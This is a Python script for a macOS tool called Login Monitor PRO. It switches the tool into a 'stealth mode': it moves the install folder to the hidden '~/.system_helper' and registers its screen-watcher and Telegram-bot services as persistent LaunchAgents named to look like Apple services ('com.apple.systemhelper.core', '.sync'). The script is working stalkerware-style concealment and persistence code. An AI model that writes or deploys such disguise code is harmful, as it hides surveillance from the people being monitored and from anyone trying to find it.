#!/usr/bin/env python3
"""
Stealth Mode Setup for Login Monitor PRO
Configures the monitor to run with less visibility
"""

import os
import sys
import shutil
from pathlib import Path

# Innocuous names for stealth mode
STEALTH_NAMES = {
    "install_dir": ".system_helper",  # ~/.system_helper instead of ~/.login-monitor
    "screen_service": "com.apple.systemhelper.core",
    "telegram_service": "com.apple.systemhelper.sync",
    "dashboard_service": "com.apple.systemhelper.analytics",
    "log_prefix": "systemhelper"
}

NORMAL_NAMES = {
    "install_dir": ".login-monitor",
    "screen_service": "com.loginmonitor.screen",
    "telegram_service": "com.loginmonitor.telegram",
    "dashboard_service": "com.loginmonitor.dashboard",
    "log_prefix": "loginmonitor"
}

HOME = Path.home()
LAUNCH_AGENTS = HOME / "Library" / "LaunchAgents"


def enable_stealth():
    """Enable stealth mode - rename everything to innocuous names"""
    print("Enabling stealth mode...")

    current_dir = HOME / NORMAL_NAMES["install_dir"]
    stealth_dir = HOME / STEALTH_NAMES["install_dir"]

    # Stop services
    os.system(f"launchctl unload {LAUNCH_AGENTS}/com.loginmonitor.*.plist 2>/dev/null")
    os.system("pkill -f screen_watcher.py 2>/dev/null")
    os.system("pkill -f telegram_bot.py 2>/dev/null")

    # Rename install directory
    if current_dir.exists():
        if stealth_dir.exists():
            shutil.rmtree(stealth_dir)
        shutil.move(str(current_dir), str(stealth_dir))
        print(f"  Moved to: {stealth_dir}")

    # Remove old LaunchAgents
    for plist in LAUNCH_AGENTS.glob("com.loginmonitor.*.plist"):
        plist.unlink()
        print(f"  Removed: {plist.name}")

    # Create stealth LaunchAgents
    python_path = "/Library/Developer/CommandLineTools/usr/bin/python3"

    # Screen watcher (core monitoring)
    screen_plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{STEALTH_NAMES['screen_service']}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_path}</string>
        <string>{stealth_dir}/screen_watcher.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/{STEALTH_NAMES['log_prefix']}-core.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{STEALTH_NAMES['log_prefix']}-core.log</string>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
    </dict>
</dict>
</plist>"""

    # Telegram bot (sync service)
    telegram_plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{STEALTH_NAMES['telegram_service']}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_path}</string>
        <string>{stealth_dir}/telegram_bot.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/{STEALTH_NAMES['log_prefix']}-sync.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{STEALTH_NAMES['log_prefix']}-sync.log</string>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
    </dict>
</dict>
</plist>"""

    # Write stealth plists
    with open(LAUNCH_AGENTS / f"{STEALTH_NAMES['screen_service']}.plist", 'w') as f:
        f.write(screen_plist)
    print(f"  Created: {STEALTH_NAMES['screen_service']}.plist")

    with open(LAUNCH_AGENTS / f"{STEALTH_NAMES['telegram_service']}.plist", 'w') as f:
        f.write(telegram_plist)
    print(f"  Created: {STEALTH_NAMES['telegram_service']}.plist")

    # Load services
    os.system(f"launchctl load {LAUNCH_AGENTS}/{STEALTH_NAMES['screen_service']}.plist")
    os.system(f"launchctl load {LAUNCH_AGENTS}/{STEALTH_NAMES['telegram_service']}.plist")

    # Update config to mark stealth mode
    config_file = stealth_dir / "config.json"
    if config_file.exists():
        import json
        with open(config_file, 'r') as f:
            config = json.load(f)
        config['stealth_mode'] = True
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)

    print("\nStealth mode enabled!")
    print(f"  Install dir: {stealth_dir}")
    print(f"  Services appear as: com.apple.systemhelper.*")
    print(f"  Logs: /tmp/{STEALTH_NAMES['log_prefix']}-*.log")


def disable_stealth():
    """Disable stealth mode - restore normal names"""
    print("Disabling stealth mode...")

    stealth_dir = HOME / STEALTH_NAMES["install_dir"]
    normal_dir = HOME / NORMAL_NAMES["install_dir"]

    # Stop stealth services
    os.system(f"launchctl unload {LAUNCH_AGENTS}/com.apple.systemhelper.*.plist 2>/dev/null")
    os.system("pkill -f screen_watcher.py 2>/dev/null")
    os.system("pkill -f telegram_bot.py 2>/dev/null")

    # Rename back to normal
    if stealth_dir.exists():
        if normal_dir.exists():
            shutil.rmtree(normal_dir)
        shutil.move(str(stealth_dir), str(normal_dir))
        print(f"  Moved to: {normal_dir}")

    # Remove stealth LaunchAgents
    for plist in LAUNCH_AGENTS.glob("com.apple.systemhelper.*.plist"):
        plist.unlink()
        print(f"  Removed: {plist.name}")

    # Recreate normal LaunchAgents
    python_path = "/Library/Developer/CommandLineTools/usr/bin/python3"

    screen_plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{NORMAL_NAMES['screen_service']}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_path}</string>
        <string>{normal_dir}/screen_watcher.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/{NORMAL_NAMES['log_prefix']}-screen.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{NORMAL_NAMES['log_prefix']}-screen.log</string>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
    </dict>
</dict>
</plist>"""

    telegram_plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{NORMAL_NAMES['telegram_service']}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_path}</string>
        <string>{normal_dir}/telegram_bot.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/{NORMAL_NAMES['log_prefix']}-telegram.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{NORMAL_NAMES['log_prefix']}-telegram.log</string>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
    </dict>
</dict>
</plist>"""

    with open(LAUNCH_AGENTS / f"{NORMAL_NAMES['screen_service']}.plist", 'w') as f:
        f.write(screen_plist)

    with open(LAUNCH_AGENTS / f"{NORMAL_NAMES['telegram_service']}.plist", 'w') as f:
        f.write(telegram_plist)

    # Load services
    os.system(f"launchctl load {LAUNCH_AGENTS}/{NORMAL_NAMES['screen_service']}.plist")
    os.system(f"launchctl load {LAUNCH_AGENTS}/{NORMAL_NAMES['telegram_service']}.plist")

    # Update config
    config_file = normal_dir / "config.json"
    if config_file.exists():
        import json
        with open(config_file, 'r') as f:
            config = json.load(f)
        config['stealth_mode'] = False
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)

    print("\nStealth mode disabled!")
    print(f"  Install dir: {normal_dir}")


def status():
    """Check current mode"""
    stealth_dir = HOME / STEALTH_NAMES["install_dir"]
    normal_dir = HOME / NORMAL_NAMES["install_dir"]

    if stealth_dir.exists():
        print("Current mode: STEALTH")
        print(f"  Directory: {stealth_dir}")
    elif normal_dir.exists():
        print("Current mode: NORMAL")
        print(f"  Directory: {normal_dir}")
    else:
        print("Login Monitor not installed")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 stealth_setup.py [enable|disable|status]")
        sys.exit(1)

    command = sys.argv[1].lower()

    if command == "enable":
        enable_stealth()
    elif command == "disable":
        disable_stealth()
    elif command == "status":
        status()
    else:
        print(f"Unknown command: {command}")
        print("Usage: python3 stealth_setup.py [enable|disable|status]")
